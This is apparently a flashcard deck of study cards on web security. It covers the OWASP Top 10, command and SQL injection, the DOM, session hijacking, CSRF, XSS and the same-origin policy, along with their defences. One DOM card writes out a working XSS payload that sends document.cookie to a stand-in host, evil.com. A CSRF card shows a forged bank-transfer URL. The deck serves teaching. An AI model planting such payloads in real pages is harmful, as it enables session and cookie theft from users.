Web Security: Basics	Name the OWASP Top 10 Web security flaws:	1. Injection \n2. Broken Authentication and Session Management \n3. Cross-Site Scripting (XSS) \n4. Insecure Direct Object References \n5. Security Misconfiguration \n6. Sensitive Data Exposure \n7. Missing Function Level Access Control \n8. Cross-Site Request Forgery \n9. Using Components with Known Vulnerabilities \n10. Unvalidated Redirects and Forwards
Web Security: Basics	Describe the first 5 Web security flaws: Injection, Broken Authentication and Session Management, Cross-Site Scripting (XSS), Insecure Direct Object References and Security Misconfiguration	1. Injection​ - (SQL, OS injection) Untrusted data is sent to interpreter as part of a command or query, tricking interpreter into executing uninteded commands and accessing data without authorisation \n2. Broken Authentication and Session Management​ - Compromising passwords, keys, session tokens or other flaws to assume other users identities due to not correctly implementing authentication and session management app functions.\n3. Cross-Site Scripting (XSS)​ - App takes untrusted data and sends it to a browser without validation or escaping, allowing attackers to execute scripts in victim browser, hijacking user sessions, defacing websites and redirecting to malicious websites. \n4. Insecure Direct Object References ​ - (direct object reference: dev exposes reference to internal implementation object, such as file, directory or database key) Manipulate references to access unauthorised data due to no access control check or other protections\n5. Security Misconfiguration ​ - taking advantage of not configuring security correctly. Due to failure to define & deploy secure configuration for the application, frameworks, app server, web server, db server and platform (default settings are often insecure); or not keeping software up to date.
Web Security: Basics	Describe the second 5 Web security flaws: Sensitive Data Exposure, Missing Function Level Access Control, Cross-Site Request Forgery, Using Components with Known Vulnerabilities and Unvalidated Redirects and Forwards	6. Sensitive Data Exposure​ - Stealing or modifying weakly protected data to conduct credit card fraud, identity theft and etc. Sensitive data requires encryption at rest and in transit, as well as precautions taken when exchanged with the browser. \n7. Missing Function Level Access Control ​ - Forging request to access functionality without authorisation due to inexistent verification for function level access rights.\n8. Cross-Site Request Forgery (CSRF)​ - Forces logged-on victims browser to send a forged HTTP request, including victims session cookie and other auth information, to vulnerable web app.\n9. Using Components with Known Vulnerabilities​ - Exploiting apps using components with known vulnerabilities, resulting in data loss or server takeover.\n10. Unvalidated Redirects and Forwards ​ - Redirecting victim to phishing/malware site or use forward to access unauthorized pages due to unproper validation when redirecting or forwarding users.
Web Security: Server-side attacks	What are injection attacks?	Injection flaws​ such as SQL, OS injection, occur when untrusted data is sent to interpreter as part of a command or query. This can trick interpreter into executing unintended commands and accessing data without authorisation. The two main attacks are command injection attacks and SQL injection attacks.
Web Security: Server-side attacks	Explain what Command Injections are and state the defenses against them. Additionally, give an example.	Injection is generally caused when data and code share the same channel: “Whois” is the code and the filename data and​ ‘;’ allows attacker to include new command. Defences include: input validation, input escaping and use of less powerful API. \nExample: service that prints result back from Linux program whois, invoked via URL like ​http://www.example.com/content.php?domain=google.com.
Web Security: Server-side attacks	How do Databases work with web servers? What is SQL and its most common commands?	Web server connects to DB server. Web server sends queries and commands according to incoming HTTP requests. DB server returns associated values. DB server can modify and update the records. \nSQL is most used DB query language. Its most commond commands are: \nSELECT - returns values of given field in specified table, for all records matching condition. \nINSERT - retrieves a set of records from DB and adds new record in specified table. \nDROP - deletes entire specified table. \n';' - enables separate commands
Web Security: Server-side attacks	Give an example of a SQL injection. What sort of defence is there for these kinds of attacks?	Web server logs in a user if user exists with the given username and pass. It sees if results exist, and if so logs in the user and redirects them to user control panel.\nDefence: create a template of SQL query, in which data values are substituted; ensures that untrusted value is not interpreted as a command.
Web Security: Client-side attacks	Explain the concept of Web browsers:	The main function of a browser is to​ present a chosen web resource by requesting it from the server and displaying it in browser window. Resources include: HTML documents, PDF files, images, other. The location of these resources are​ specified by user usign URI (Uniform Resource Identifier)
Web Security: Client-side attacks	What are the components of a browser?	See Figure 10.
Web Security: Client-side attacks	Explain the concept of the Document Object Model (DOM):	DOM is a programing interface for HTML, XML, SVG documents. It provides a structured representation of a document tree and defines how structure can be accessed from other programs for changing doc structure, style or content. DOM represents documents as structured groups of nodes and objects with properties and methods. Nodes can have event handlers attached, executing them once event is triggered. Essentially, it connects web pages to scripts or programming languages.
Web Security: Client-side attacks	Draw the DOM diagram:	See Figure 11.
Web Security: Client-side attacks	Give a few examples of using DOM:	"Displaying an alert message by using the alert() function from the window object: \n<body onload=""window.alert(’welcome to my page!’);""> \nDisplaying all the cookies associated with the current document in an alert message: \n<body onload=""window.alert(document.cookie);""> \nSending all the cookies associated with the current document to the evil.com server if x points to a non-existent image: \n<img src=x onerror=this.src=’http://evil.com/?c=’+document.cookie>"
Web Security: Client-side attacks	Explain the concept of session hijacking:	Session hijacking​, also known as cookie hijacking, exploits a valid computer session to gain unauthorized access to information or services in a computer system. Sessions can be hijacked in different ways. The most common are: \nCookie theft vulnerabilities: Predictable session tokens (Cookies should be unpredictable); HTTPS/HTTP: site has mixed HTTPS/HTTP pages, and token is sent over HTTP (set secure attr for session tokens, always issue a new session token on login); cross-site scripting (XSS) vulnerabilities \nCross-site request forgery (CSRF) vulnerabilities
Web Security: Client-side attacks	Explain the concept of Cross-site requrest forgery (CSRF):	CSRF forces user to execute unwanted actions on a web application in which they are currently authenticated. CSRF attacks target state-changing requests, not theft of data, since attacker has no way to see the response to the forged request.
Web Security: Client-side attacks	How does CSRF work in practise?	Attacker targets a user who has an account on a vulnerable server, builds an exploit URL and tricks the victim into making a request to the vulnerable server as if intentional. The attacker has two tools: ability to get the user to click the exploit link; and ability to have victim visit attackers server while logged-in to a vulnerable server. The key condition of this attack is that ​requests to vulnerable server have predictable structure.
Web Security: Client-side attacks	Give an example of a CSRF attack:	Alice wishes to transfer $100 to Bob using the bank.com web application. This money transfer operation reduces to a request like: GET ​ http://bank.com/transfer.do​?acct=BOB&amount=100 HTTP/1.1 \nThe bank.com server is vulnerable to CSRF: the attacker can generate a valid malicious request for Alice to execute!! The attack comprises the following steps: \n1. Eve crafts the following URL http://bank.com/transfer.do acct=Eve&amount=100000 \n2. When Alice visits Eve’s website she tricks Alice’s browser into accessing this URL
Web Security: Client-side attacks	What are CSRF's defences?	Checking the referrer​ header in the client’s HTTP request can prevent CSRF attacks. Ensuring that the HTTP request has come from the original site means that attacks from other sites will not function. \nInclude a secret in every link/form: Can use a hidden form field, custom HTTP header, or encode it directly in the URL; Must be unpredictable!; Can be same value as session token (cookie); Ruby on Rails embeds secrets in every link automatically
Web Security: Client-side attacks	How does Cross-site scripting (XSS) work?	The attacker's goal is to inject code into browser with the guise of conforming to same-origin policy: \nSite “evil.com” provides malicious script. \nAttacker tricks the vulnerable server (bank.com) to send attacker’s script to the user’s browser! \nVictim’s browser believes that the script’s origin is bank.com...because it does! \nMalicious script runs with bank.com’s access privileges
Web Security: Client-side attacks	What are the differences between Stored and Reflected XSS attacks?	Stored attacks: injected script is permanently stored on the target servers, eg. database, message forum, visitor log, comment field, etc. Victim retrieves the malicious script from the server when it requesting stored information. \nReflected attacks: injected script is reflected off the web server​, eg. error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site. The key to reflected XSS attack is to find a good web server which will echo user input back in HTML response.
Web Security: Client-side attacks	What are the XSS's defences?	1. Escape/filter output: ​ escape dynamic data before inserting it into HTML \n2. Input validation: ​ check that inputs (headers, cookies, query strings, form fields, hidden fields) are of expected form (whitelisting) \n3. CSP: ​ server supplies a whitelist of the scripts that are allowed to appear on the page
Web Security: Client-side attacks	What problem does the Same-origin policy (SOP) tackle?	Assuming you are logged into Facebook and visit a malicious website in another browser tab, the SOP prevents JavaScript on that website from doing anything to your Facebook account that you are allowed to do through accessing the DOM associated with the Facebook page.
Web Security: Client-side attacks	How does the SOP work?	The SOP restricts how a document or script loaded from one origin (e.g. www.evil.com) can interact with a resource from another origin (e.g. www.bank.com). Each origin is kept isolated (sandboxed) from the rest of the web. The SOP is very important when it comes to protecting HTTP cookies (used to maintain authenticated user sessions)
Web Security: Client-side attacks	What is an origin in the SOP context?	An origin is defined by the​ scheme​, the host​ and the​ port​ of a URL. SOP restricts access to DOM of web resource to scripts loaded from same origin. Cross-origin access can be allowed using CORS (Cross Origin Resource Sharing): this is a mechanism that allows many resources (fonts, JavaScript, etc) on a web page, to be requested from another domain outside the domain from which the resource originated. Cross-site HTTP requests initiated from within scripts are subject to SOP restriction for security reason
Web Security: Client-side attacks	What is, and how does Javascript work?	JS is a powerful web page programming language. Scripts embedded in web pages are returned by the web server, and are executed by the browser. They can: alter page contents (DOM objects), track events (mouse clicks, motion, keystrokes), issue web requests and read replies, maintain persistent connections (AJAX), read and set cookies. The HTML <script> elements can execute content retrieved from foreign origins.
